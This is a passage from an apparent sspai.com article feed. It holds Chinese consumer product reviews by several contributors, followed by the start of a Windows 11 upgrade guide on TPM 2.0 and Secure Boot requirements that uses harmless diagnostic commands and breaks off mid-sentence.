href=\"https://www.bilibili.com/video/BV1k44y167Q7/\">不甚理想</a>。</p>\n<p>于是，趁着 618 搞活动凑满减，我买了一个曾经在一位 UP 主的视频里见过的，可以暂时解决一部分问题的玩意儿——</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/7eeec88184b4e1d5d7f9de7558e081ca.png\"></figure><p>按照商家的说法，这个玩意儿叫麦克风隔音屏，理论上要在已经装好的录音棚里才能更好发挥作用。对于我这种要求不高的人来说，单纯有这样一个设备已经能解决不少问题了。虽然唱歌这样大音量的任务上它的作用比较有限，但如果是普通音量的交流、录制旁白等活动，这个降噪板吸收声波的成效可以说十分显著。我 <a href=\"https://www.bilibili.com/audio/au2389802\">录了一小段前后对比</a>，不考虑嗓子状态的差别，在房间摆设状态不变，只是增加了降噪板，后期仅降噪的情况下，我用同样音量念白的语句听起来就清晰了不少。</p>\n<p>要说缺点的话，这麦克风我平常就只能架在这里当成唱歌和录东西专用的麦了，我实在懒得把它卸下来架回桌上，它要是没有这么大占地面积就完美了。</p>\n<h2>@Microhoo：智米风扇 3</h2>\n<ul>\n<li>购入渠道：天猫旗舰店</li>\n<li>购入价格：549 元</li>\n</ul>\n<p>贵州夏天大部分时候的温度普遍稳定在 25～28℃ 左右，考虑到成本和舒适度，风扇比空调的需求会更多一些。其实本来是想要狠狠心买巴慕达的，但因为 6.18 买了太多东西以致于家道中落所以只能消费降级买小米系的产品——而我其实对小米系的不关乎安全性且千元以下品类有很不错的好感度。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/d4742003bc9e6c0be291d8709e88e1aa.jpeg\"></figure><p>再往前几年其实很难想象落地风扇能和「移动性」混为一谈，我也是在之前看 cbvivi 的某个视频时看到他说使用电池版巴慕达的惊人体验才开始对这个品牌种草，所以即便是买不了巴慕达，「带电池」也是我选购替代品的基本原则之一。</p>\n<p>智米风扇 3 的电池续航官方标称是 20h，但我想很多人包括我都不会注意到它详情页最下方的小字——1 档风速下——而我开到最高 100 档使用的续航大概是 6 小时左右，倒是也能应付室内使用的大部分场景，例如吃饭或者阳台发呆，即便是抬到卧室，通常你也不会设定到这么高档在睡觉时吹，所以风吹一整宿也绰绰有余。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/3ce7fd0e824172f2592dea3b71502b52.jpeg\"></figure><p>巴慕达备受推崇的主要原因是它专利的自然风系统，当然我没有体验过所以不妄加褒贬，但智米也有一个所谓的「模拟自然风」，相比前者从扇叶结构获益，智米是用所谓大数据和算法调整转速实现。使用之前因为断章取义我以为它只是会自动控制风速在一个合适的值而已所以也没有过多期待，但真正吹上的时候我是非常想站起来鼓掌的。</p>\n<p>开启自然风模式后，你的实际体感真的很像是在户外吹自然风，也就是说它的风速是随时变化的，内心平静一点甚至能在脑海里模拟出「波浪涟漪」的感觉。当然只描述体感你肯定觉得没啥鬼用，但它解决了一个风扇的巨大历史问题——不能死盯着人吹。用过传统风扇的你肯定体验过不对着吹和没开一样，对着又受不了，摇头模式里一下一下的喷射过来又心里痒，但自然风模式下就不一样了，即便是固定对着你吹，也只是会让你感到凉快和舒适——不过这只适用于「略热」的场景，如果是类似广东那种动辄三十几四十度的夏天，这个模式估计又会太不痛不痒。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/45cbaf12b8217021b8b004ada25370bb.jpeg\"></figure><p>既然是小米系，那么一定可以联网。落地风扇通常会与使用者保持一定距离使用，所以要么坐下了才想起来开或者出门了突然惊觉好像没关风扇是常有的事儿，在米家 app 中绑定风扇后不仅可以便捷的开关和设定功能，还能定时，非常灵活称心如意。如果家里有老人，它其实还配套了一个小小的蓝牙遥控器，但只能简单的启闭和调整风速模式。</p>\n<p>反正，它已经我走哪跟哪了。</p>\n<h2>@揽件阿平：飞智银狐 T1 耳机</h2>\n<ul>\n<li>入手渠道：<a href=\"https://item.taobao.com/item.htm?spm=a1z10.3-c-s.w4002-22968806714.10.15dc61f0J5Q8hu&amp;id=650129707761\">少数派商店</a>\n</li>\n<li>价格：折后 289 元</li>\n</ul>\n<p>我最近又开始玩和平精英手游了，想着再弄个专门玩游戏的真无线耳机。</p>\n<p>在问路的推荐下，我入手了飞智这款。这个品牌是做手游半截手柄起家，几年前我就用过他们家手柄，做工和手感都不错。但他们做的耳机怎么样说实话我一开始没有抱什么期望，用了两个星期发现，作为一款两百多的真无线游戏耳机，它竟然还不错。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/d80ae32e1bf6791a014f820a2e0e4b28.jpeg\"></figure><p>最戳我痛点的是它的「轻」。耳机盒加上耳塞只有 48g，这个重量比我的 AirPods Pro 还要轻几克。</p>\n<p>耳塞更轻的好处，是能提升长时间佩戴的舒适度，尤其是对于随便就是一两小时的玩游戏来说。我最近经常玩完游戏好一会儿才想起耳机忘了摘，就因为它戴起来够轻，加上舒适度也 OK，总是「无感」到让我忘了它的存在。</p>\n<p>至于更轻的耳机盒，大大方便我带出门，我平时出门就背一个单肩小包或者干脆塞裤子口袋，所以我带的东西一定得尽可能少和轻，这种轻的耳机盒太适合我。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/c2117c5edc8d02b8e204da99cbff9834.jpeg\"></figure><p>这款耳机的耳塞类似 AirPods Pro，属于浅入耳式，对于不习惯侵入更深的入耳式耳塞的人来说，佩戴感受非常友好。不过相对的，浅入耳式的隔音就会稍微差一点，如果是在外面比如嘈杂的商场排号等位时玩游戏，用这个耳机就需要调大一点音量才行了，毕竟它没有主动降噪。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/fcfb5bc6b382d7686ab4b3194371f805\"></figure><p>用它打游戏的声音表现也还不错，毕竟是针对手游专门做的声音调教，脚步声很清晰，听不同方位的脚步也没问题，这对我来说就很足够了。</p>\n<p>另外，飞智这款耳机使用的是蓝牙 5.0，他们宣称使用的是自研的名为 Foxspeed 技术，无论在苹果或安卓手机上都能保持 60ms 的低延迟。这个低延迟模式在使用过程中，需要手动敲三下右耳塞来开启。我现在一般是用 OPPO 来玩游戏，两周用下来，延迟和信号表现都挺稳的，没遇到过连接不稳定的情况。</p>\n<p>这款耳机的外观唯一差点意思的地方是，它的塑料材质初上手的观感会显得廉价，但摸起来触感不错，干爽不粘指纹，和我黏手的一加 9 Pro 闪银后盖形式鲜明对比。</p>\n<p>耳机续航标称是耳机 4 小时 + 耳机盒 20 小时，我实际用起来没啥感觉，日常很够用。</p>\n<p>作为一款两百出头的真无线游戏耳机，这耳机性价比挺不错的，成本都花在了刀刃上，玩游戏和佩戴的体验很稳，外观质感略弱一点。像我这样平时 iPhone 听歌有 AirPods Pro，再买这样一个耳机在安卓上玩游戏，蛮爽的。</p>\n<h2>@zachary：JBL CLIP4</h2>\n<ul>\n<li>购买渠道：JBL 海外旗舰店</li>\n<li>参考价格：¥374（品牌首单优惠）</li>\n</ul>\n<p>去年年底的时候，突然对露营产生了着迷。经常幻想自己能够沿着海边驱车，手机开着地图循着一条条无名路前进，走到一个合适的平地就停下来支起帐篷，架设好折叠椅、茶几和炊具，打开音响播放林家谦的歌，然后坐下来静静望着风景思考人生。</p>\n<p>如今半年过去了，以上提到的种种露营设备全部未购，只有音响有了着落。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/22/a39131e662249cf40ee8595fb85344d6.jpg\"></figure><p>其实除了露营，还有许多场景让我产生了渴望入手一款便携式音响的想法。比如说爬山的时候、徒步的时候、在大型景区游览的时候；总而言之，只要是需要长时间步行的过程，能够有音乐的陪伴总是乐事一件。当然开手机功放也不是不行，就是有点土吧。</p>\n<p>我原本以为自己的需求容易实现：在满足音质要求的情况下，要够小、够便携，最好是有卡扣能够夹背包上，这样我就可以腾出手来拍摄；另外还得足够价格也得亲民，否则如果用到能够买一款旗舰级音响的价格来购置，实在没有必要。但是后来发现满足需求的并不多。</p>\n<p>筛选了一遍过后，JBL CLIP4 是最终入手的产品。其重量与华为 Mate 40 RS 保时捷版差不多，只有 239g；防水等级 IP67，就算在户外遭遇降雨，或者放在泳池边也无需担心；蓝牙版本升级到 v5.1，意味着覆盖范围更广功耗更低，续航达到了 10 小时；充电接口也升级到了  Type-C，充电速度更快，这点的确很新鲜，或许在今后发布的音响设备中会更加普遍。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/22/article/096a4c6a66e34c9a00ff7e66f343b875\"></figure><p>更吸引我的是，相比于它的上一代产品 CLIP3，CLIP4 提供了多达 10 种颜色选择，深谙苹果的营销之道。不过产品造型从圆形变为了椭圆形，好看与否就见仁见智了，我个人认为都能接受，至少颜值比起更为常见的「JBL GO3 音乐金砖」（我也不知道为什么，很多商家活动都喜欢送这款音响）要高出不止半点。表面材质依然采用织物包裹，这也是他们家的惯用设计了。</p>\n<p>说到可能是最让人关注的音质问题。因为个人也不是玩家，可能说不出个所以然，凭感觉描述的话，低频清脆高频依然带感，无论是播放什么类型的音乐都没有明显的杂音。根据<a href=\"https://detail.tmall.hk/hk/item.htm?tbpm=2&amp;spm=a1z09.2.0.0.3ecc2e8dxQSgcZ&amp;id=638041835161&amp;sku_properties=5919063:6536025\">官方描述</a>，CLIP4 采用了 JBL PRO SOUND 特色音效，信噪比 &gt;85dB，作为一款编写的户外音响来说我认为相当满意。�「万元以下听个响」的玩家们仅供参考。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/22/ee6b72cb24ac4c63f55ea8557b183467.jpg\"><figcaption>唯一的迷彩色，超喜欢嘿嘿~</figcaption></figure><p>其实 CLIP4 我在今年2月份就入手了，直到五一期间才认真地把它带到黄果树瀑布使用了一番（是的，然后拖到现在才写），真的给旅途增添了不少乐趣~</p>\n<h2>@黎明前线Alan：Bestand 妙控键盘/妙控板二合一支架 </h2>\n<ul>\n<li>入手渠道：淘宝</li>\n<li>参考价格：¥79（原价 ¥154）</li>\n</ul>\n<p>虽然从年初自己的工作主力机就已经由 PC 变成了 Mac，但直到最近才下定决心给自己的妙控键盘添置一块妙控板，但由于桌面较小同时设备较多，便想到了在 ins 上有看到一些博主选择了整体式框架来将妙控键盘+妙控板合二为一进行收纳移动。</p>\n<p>由于这可能是一个比较小众的需求：所以我直到打开淘宝才意识到根本不知道这种东西应该用什么关键字搜索，但后来在多次关键字搜索尝试之后，还是找到了这一款 Bestand 出品的妙控键盘/妙控板二合一支架。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/24/article/28e4a25a9ff210809194eddba20eb6e9\"></figure><p>由于桌面并不是很大，而且桌面除了摆放键盘之外平时很多时候还需要腾地方给各种文件，有了这个二合一框架之后，移动妙控键盘与妙控板这一对组合就方便了不少，而且支架本身四角以及边缘都有一层塑料包裹，实际上起到了一个保护壳的效果，在桌面上移动时还能避免各种设备磕碰给妙控组合的铝合金边框造成划伤。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/24/article/7912bce7e4bc85e289dbf746910dd5f4\"></figure><p>除了二合一的功能之前，这款支架底部还覆盖了大面积的防滑垫，但在鼠标垫上防滑效果相比妙控键盘/妙控板自带的四角防滑垫效果其实区别不大，另一个我未曾预料到的功能是：这款支架还会将妙控键盘与妙控板整体抬高近 1cm（毕竟是支架嘛），同时也增大了倾角，我实际使用中明显感受到这个角度有比原本的键盘姿态更加舒适，输入效率也有一点提高，算是意料之外的优点。</p>\n<p>除了上述之外，由于这本身只是一个塑料支架，所以拿起时在妙控键盘与妙控板的连接处总有一点松动的感觉；而且就一个塑料支架来讲，原价毫无疑问是虚高的，但好在拿到手实际质感并不算太差，倒也算是对得起（打折后的）价格了。</p>\n<p>PS：从拿到手的包装来看，这款产品很可能是主要面向海外市场销售。</p>\n<p>PPS：虽然妙控键盘/妙控板都有黑色款，但这款支架似乎并没有对应的黑色版本在售，而且设计上也对习惯把妙控板摆在左边的左撇子用户不是那么友好，所以购买时或许也要多加考量自己的实际使用需求。</p>\n<h2>@橙子虾：迪卡侬防晒风衣</h2>\n<ul>\n<li>入手渠道：迪卡侬线下门店</li>\n<li>入手价格：179元 × 2件</li>\n</ul>\n<p>当前南宁青秀区室外的气温为 35°C，加上有「绿城」称号的独特环境，使得南宁的酷热感格外剧烈。</p>\n<p>这是我购买防晒风衣的客观因素，主观因素是在工作上增加了户外走动的部分，从办公室行走至正在装修的新门店需要 8 分钟左右。在上述户外天气无遮挡的情况下，短短的 8 分钟对个人来说，每一步都是自我毅力提升的考验，尤其是等红绿灯的时候。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/27/b2814f453dd528b99dd1e8fb2e272a91.png\"><figcaption>烈日下红绿灯的考验</figcaption></figure><p>实际上我可以选择带着遮阳伞出门，在物理防晒效果上是首选。可我的行动习惯，出门是不喜欢双手拿个什么东西的，会觉得很累赘（只有我一个人是这样吗？）。于是，能全身覆盖防晒、轻便出门、无负物感的防晒风衣成了我夏日户外走动的最优解。</p>\n<p>迪卡侬的这两款防晒风衣体验下来，只能陈述主观体验，因为没有检测紫外线的机器。</p>\n<p>其厚薄的程度，在上身后并不会觉得自己是真的穿了一件外套，有时候行走起来会忘记自己还穿了一件衣服。这里促使个人产生忘记风衣的原因，是由于材质和开孔的设计让其透气性能表现出色，有风迎面而来时，真的能感受到风穿过衣服，多少有一点站在树荫下乘风的快感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/27/293182f2930c534460dc1839f36623a1.png\"><figcaption>防晒风衣一览图</figcaption></figure><p>至于是否能阻挡 99% 的紫外线，我不能肯定，但吊牌的说明部分是明确该种材料的 UPF 评级为 50+，也即为优秀紫外线保护。户外暴晒行走已经没有之前炽热的疼痛感，更多是一种无惧太阳的自在感，再也不用怕突然晒黑了。</p>\n<p>仅仅是防晒风衣，我觉得稍微欠缺了一点，风衣对于面部的防晒不是特别到位。这里可以搭配鸭舌帽，再套上其帽子，上半身的覆盖程度就剩一张脸了。如口罩也戴上，那几乎处于防晒的无敌状态。</p>\n<p>另外，非常值得说的是，这两款防晒风衣的材质极其地轻薄。折叠收纳后，也仅和一台手机大小相当。由于我平常很懒，根本不会收纳起来，所以我是直接塞包里的，但轻薄的材质让其放包里也不会占用大多的空间，而且重量是可以忽略不计。以后每到夏天，我的背包就多了一件常驻装备。</p>\n<p>市场上防晒风衣的品牌很多，价位从 20 元~200 元不等，TB 一搜「防晒风衣」，眼睛直接花掉，完全不知道选哪件。那为何会选择迪卡侬呢 ？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/27/47165956b7e0d11ad0df98cb6dbc096d.png\"><figcaption>小小太阳雨也不怕</figcaption></figure><p>是因为去年购买的两件迪卡侬衣服（「三合一冲锋衣」和「徒步防水风衣」）的防水性能是真的远超预期。冬天里下点小雨，完全不需要撑伞，套上帽子就完事。春节在家外出写稿时，小雨中步行 30 分钟至咖啡馆，完全没有任何渗透，外层挂满了水珠，内层依然干燥。其品质的表现，让我十分信服迪卡侬这个品牌在户外运动方面的能力。最后在合理价格的加持下，很多时候看运动器具，都首选迪卡侬了。</p>\n<p>备注①：这两款防晒风衣的防泼水功能，是有时效性的。根据官网信息，推荐每 3 次洗涤之后进行防泼水的修复处理。但我去线下店问工作人员，得到的回答是这款防晒风衣正常洗涤即可，防泼水处理是不需要做的。</p>\n<p>备注②：UPF 评级为 50+，能阻挡 99% 的紫外线。</p>\n<h2>@Peggy_：米家床头灯 2 代 </h2>\n<ul>\n<li>入手渠道：淘宝</li>\n<li>入手价格：169 元</li>\n</ul>\n<p>新搬入租住的房子后，我陆陆续续添置了一些必备的智能家居，之前我需要跑到开关前才能开灯，现如今我更喜欢在打开家门的时候顺嘴喊 Siri 帮我打开米家台灯 1S，这个过程仿佛是家对我的一种欢迎仪式。除了台灯以外，出于专物专用的执拗想法，我一直想要给床头桌上添置一个专门的床头灯，以省去入睡前还要下床关灯的不便。</p>\n<p>在经历了米家床头灯 2 代漫长的缺货期后，我一度想要再购买一个台灯 1S 作为床头灯使用，好在几经等待米家床头灯 2 代终于有货了。相比于其他常规款式的床头灯，我更看重米家床头灯 2 代对于 Homekit 的支持；此外，在任何一款 app 的宣传图上，米家床头灯 2 代均以一种干净、素雅的形态出现，因此颜值也是我考虑购买它的一大原因。</p>\n<p>在拿到这款床头灯后，我最先注意到的就是它那和小米台灯 1S 一样硕大的插头，如果房间的插座布局一般的话，这个硕大的插头就会时时刻刻在插线板上强势地彰显自己的存在感。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/30/9a1b046b491caa5cb56086c213b9d05f.JPEG\"><figcaption>实际的效果 | 照骗效果</figcaption></figure><p>而到了具体使用阶段，我对于米家床头灯 2 代的智能功能还算满意，但是需要注意的是如果你仅仅使用苹果内置的家庭应用，产品宣称的彩光模式便无法完全享用到，仅在用户使用米家应用时，才能体验到全部的灯光效果，不过就我个人的使用习惯来说，我似乎并不会想要一盏五颜六色的灯。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/30/5d5a6016bd008544b94c51717b176e59.JPEG\"><figcaption>不同应用下的控制效果对比</figcaption></figure><p>来到夜间，米家床头灯的光照效果只能说是差强人意，如果你在购买前调整好自己的心理预期，即你需要的仅仅是一个能够辅助照明的昏暗夜灯，那么米家床头灯 2 代完全能满足你的需求。但是如果你需要的是一个代替卧室灯进行照明的主光源，那么或许米家床头灯 2 代并非最佳选择。毕竟小米台灯 1S 只要 149 元就能带来更好的照明效果，而米家床头灯 2 代还要贵上 20 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/30/6a75c7085911166cc39199bc750fbb7e.JPEG\"></figure><p>总之，米家床头灯 2 代的产品定位足够清晰，作为一款床头灯它足够尽职尽责，隐藏好插头后它也可以足够美观大方，如果你想要就一盏床头灯，那么它会是一个不错的选择；但是如果你对于夜间光照度有更高的要求，或许应该考虑其他灯具。</p>\n<h2>彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/d4a37601b2ac8462f9f7142c155b2c82.gif\"><figcaption>赛博军火</figcaption></figure><p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<p>很多读者表示自己也有一些希望分享的有趣产品。为了能让更多读者参与，我们决定在「新玩意」栏目最后添加一个新的版块，邀请大家来 Matrix 社区发表文章分享你的「新玩意」，你只需要：</p>\n<ul>\n<li>在标题中标注「新玩意」</li>\n<li>用 500-1000 字介绍产品</li>\n<li>配上 1-2 张产品的实拍图片</li>\n<li><strong>在网站个人信息中补充支付宝账号</strong></li>\n</ul>\n<p>成功入选栏目还可以得到 108 元的「剁手抚恤金」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派sspai官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67510"},{"title":"升级 Windows 11 碰壁了？送你一份尝鲜指南","date":"2021-07-01 08:00:00","description":"\n<p>本周，<a href=\"https://sspai.com/post/67413\">Windows 11</a> 开始通过 Windows Insider Dev 通道向部分用户进行推送，但想要尝鲜却被 Windows 11 拒之门外的用户不在少数。</p>\n<p>Windows 11 对设备的硬件配置究竟有什么要求，你的设备如何升级到 Windows 11？</p>\n<p>基于微软目前给出的相关文档、信息和部分用户的实际体验，本文整理了 Windows 11 尝鲜相关的常见问题，希望能够为你提供一些参考。</p>\n<h2>何时能升级</h2>\n<p>Windows 11 的首个预览版本 22000.51 已于 6 月 29 日面向 Windows Insider 推送，如果你的设备满足硬件配置要求，同时加入了 Windows 预览体验计划的 Dev 渠道，直接在设置中检查更新即可通过 OTA 升级，步骤与常规系统更新无异。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/dfccff183629643e299bf6eaa4d3c2fa\"></figure><p>当然，预览版本的稳定性逊于正式版，Dev 渠道的代码未经过严格的可靠性验证，有较大几率出现影响正常使用的 bug。如果 Windows 是你的主要操作系统，我建议等待 Beta 渠道或 Release Preview 渠道开放后再考虑升级，不要贸然使用生产力设备尝鲜。</p>\n<p>目前微软并未公布 Windows 11 正式版的具体推送日期，<strong>仅表示将在今年晚些时候推出</strong>，正在运行 Windows 10 的设备将在 2022 年上半年收到免费更新。</p>\n<p>但发布会上的诸多暗示，以及沃尔玛等零售商的宣传语都指向了同一时间点。比如 The Verge 发布的一篇 <a href=\"https://www.theverge.com/2021/6/28/22553666/microsoft-windows-11-october-20th-release-date-hint-rumor\">报道</a> 就指出，Windows 11 的正式推送时间或许会在今年 10 月，因为在不久前的 Windows 发布会中微软埋下了多处暗藏 Windows 11 正式推送日期的细节，包括 Microsoft Teams 对话消息、任务栏时间、日历事件、OneDrive 照片回顾等等，这些截图中的日期都指向了<strong> 2021 年 10 月 20 日</strong>。</p>\n<h2>哪些设备能升级</h2>\n<p>和当年的 Windows 10 类似，微软为推广 Windows 11 又一次祭出了「免费升级」大法，上一次是 Windows 7 和 Windows 8.x 的消费级版本可以免费升级至 Windows 10，这一次则是「符合要求的 Windows 10」可以免费升级到 Windows 11。</p>\n<p>虽然都是免费的跨版本升级，措辞的变化也暗示着 Windows 11 对我们的设备有了新要求。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/bf838638b9e875cd872ce68e8378d8fd\"></figure><p>从这张最新的 Windows 11 系统要求中不难看出，要想「符合要求」并获得免费升级其实存在一定的硬件门槛。首先是 Windows 11 不存在 32 位版本，因此处理器必须支持 64 位，对应的就是内存达到 4GB 以上，存储空间也至少为 64GB。</p>\n<p>但真正的难点，也是这次卡住很多人的关键，则是<strong>支持 UEFI 安全启动</strong>以及<strong>受信任的平台模块 (TPM) 2.0 版本</strong>。</p>\n<h3>UEFI 安全启动</h3>\n<p>因为当年需要让 Windows 7 和 Windows 8.1 用户平滑升级，因此 Windows 10 的最低系统要求几乎延续了 Windows 7 的要求，包括并不强制要求 UEFI 安全启动（Only UEFI）。</p>\n<p>情况在 Windows 11 这里有了变化。</p>\n<p>简单来说，在 Windows XP 时代我们只有 BIOS 启动，对应的磁盘分区结构则是 MBR，这样的结构一方面安全性较差，很多恶意程序可以在系统启动前就加载，另一方面最高也只能够支持到四个主分区，最高支持硬盘容量为 2TB。</p>\n<p>因此之后就出现了 BIOS 的高级版本 UFEI，对应的分区表也采用了更新的 GPT。虽然 UEFI 在 2007 年就已经出现了，由于 Windows 7 开发时并没有成为标准，2012 年以后的 PC 虽然大多出厂就带有 UEFI 支持，为了兼容性（安装 Windows 7）还是会允许用户打开 Legacy 兼容模式来安装 Windows 7 或 32 位操作系统。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/1b4ebdeaa59e46cdbe24150bb125781e\"></figure><p>而到了 Windows 11 ，因为只支持 64 位操作系统，从安全性考虑就<strong>只允许采用 UEFI 安全启动</strong>的方式进行引导，也就是在系统 BIOS 中设置为「only UEFI」并且关闭 Legacy 兼容模式，这样才能正常的安装、运行 Windows 11。</p>\n<h3>TPM 2.0</h3>\n<p>UEFI 支持其实并不是这一次 Windows 11 系统要求中最为苛刻的，更苛刻的是系统最低要求中强制需要可信平台模块 2.0（TPM 2.0）。TPM 中文名叫做<strong>可信平台模块</strong>，英文 Trusted Platform Module，简单来说就是一个以硬件形式处理设备加密的工具，可以保护当前硬件设备的数据不被破解。</p>\n<p>目前市面上的电脑如果支持 TPM ，一般上分为两种：</p>\n<ul><li>基于处理器主板的 TPM</li></ul>\n<p>在很多的品牌主板上都有集成，比如如果是 Intel 处理器上的主板，那么在 BIOS 里面会有个 Intel Platform Trust Technology 设置项目，而 AMD 处理器的主板有个类似的叫做 fTPM。它们都是属于集成的 TPM，如果你有相关设备，升级前记得打开即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/3b9c9aeaea8e50310db5ba99e6208744\"></figure><ul><li>基于独立加密模块的 TPM</li></ul>\n<p>有些主板中并没有集成Intel PTT或者 AMD 的 fTPM，那么就需要使用单独的芯片模块来实现 TPM 加密了。这个小模块通过针脚和主板进行通信，从而实现 TPM 功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/cbf37f402769790bf203e8e4ea043034\"></figure><p>当然微软也并没有完全说死 TPM 2.0 的支持，考虑到 OEM 设备商的利益（很多厂商从法律法规或利润最大化的角度并不会安装 TPM），微软在其最新的一版硬件需求说明文档中进行了特殊备注，表示可以允许经过其认证的设备在没有安装 TPM 2.0 的情况下预装 Windows 11 出货，因此最终的硬件支持上还要等待下半年正式版发货才能最终确定。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/35add06fcd4485cecfe0e8d4c0423cbf\"></figure><h3>如何自检</h3>\n<p>微软在 Windows 11 发布活动的第一时间推出过一款硬件检查软件「电脑健康状况检查工具」，方便用户检测当前的设备是否满足升级到 Windows 11 的硬件需求。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/9d365642e9a7af28a2d90ea13ec23899\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/a1b9475def0df2d034a5b3da9c753515\"></figure><p>打开软件之后点击「立即检查」就可以识别当前的硬件是否支持升级到 Windows 11，发布之初，这款工具并不会指出不符合的硬件到底哪一项不符合，虽然在之后的更新中解决，但微软还是决定暂时下线检查工具，进一步完善后重新推出。现在，我们可以通过一款第三方应用来进行检测。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/85fd2fa026420b9c35093dcad279d115\"></figure><p>这款名为「<a href=\"https://github.com/rcmaehl/WhyNotWin11\" target=\"_blank\">WhyNotWin11</a>」的检查工具相比微软的检查工具提供了更为全面的信息，既包括了硬件中不符合最低硬件标准的信息项目，也包含了显卡支持等情况，相对来说信息要更为准确详细。</p>\n<h3>升级后的 Insider 提示判断</h3>\n<p>纵使系统硬件不支持，但我们依然可以使用各种「方法」升级到 Windows 11。但可以升级到 Windows 11 不代表万事大吉，微软将会在未来限制这些硬件能否使用正式版 Windows 11，甚至完全不满足的设备连 dev 测试版都将不再推送。</p>\n<p>如果你已经在 Insider 中了，那么你可以通过「设置」- 「Windows 更新」-「Windows 预览体验计划」的提示信息查看自己的电脑是否符合正式版的需求还是只能呆在测试版。目前有三种情况：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/ede278dcb58890672e772b4b055042a9\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/3ff21e6484f2a3fe4c512eb9b59ca847\"></figure><p>本次 Windows 11 Dev 测试中，所有种类的 CPU 和是否具备 TPM 的电脑都将可以参与测试，但只要不支持 TPM 那么在「Windows 预览体验计划」的提示信息一定是红色的；未来正式版只推送给具备 TPM 2.0 和具备 <a href=\"https://docs.microsoft.com/en-us/windows-hardware/design/minimum/windows-processor-requirements\" target=\"_blank\">兼容</a> 处理器的电脑，当然也不排除 <a href=\"https://blogs.windows.com/windows-insider/2021/06/28/update-on-windows-11-minimum-system-requirements/\" target=\"_blank\">下放</a> 给 7 代 Intel 和 AMD Zen 1 处理器的可能性。</p>\n<h2>如何升级</h2>\n<h3>排查环境问题</h3>\n<p>鉴于上面提到的升级条件，你的设备如果在升级时遇到了阻碍，不妨先使用按照以下流程检查一下 TPM 相关原因：</p>\n<p>若想了解当前设备是否支持 TPM，最简单的方法是以管理员身份运行 PowerShell，键入 <code>Get-Tpm</code> 指令并回车。<code>TpmPresent</code> 的值为 <code>True</code> 则代表硬件已集成 TPM 组件，<code>TpmReady</code> 为 <code>True</code> 代表 TPM 符合系统标准，其它信息的含义可参考 <a href=\"https://docs.microsoft.com/zh-cn/powershell/module/trustedplatformmodule/get-tpm\">微软官方文档</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/ac479b47911ceb0a298a85595a9f176f\"></figure><p>命令行提示不支持也不必灰心，让我们首先确认主板型号。使用快捷键 <code>Win+R</code> 然后运行 <code>Msinfo32</code> 打开系统信息面板，然后就能在右侧窗格中找到主板制造商和主板产品：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/e49727b0dbcbc6882d22f5ed2cb3a03a\"></figure><p>如果你和我一样使用的是 OEM 主机，获取到主板型号后可能还需要在相关品牌官网给出的信息中进一步查看实际主板型号，比如这里惠普 843B 主板对应的实际型号就是 Intel H370：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/1cdea1fc29d9c6e9649f01598082b7de\"></figure><p>通过对 Intel H370 的主板信息进行检索可以进一步获悉，这块主板默认是支持 TPM 加密的，因此不排除 BIOS 屏蔽了相关选项。于是在进入 BIOS 并开启 TPM 开关后，我的设备成功满足了 Windows 11 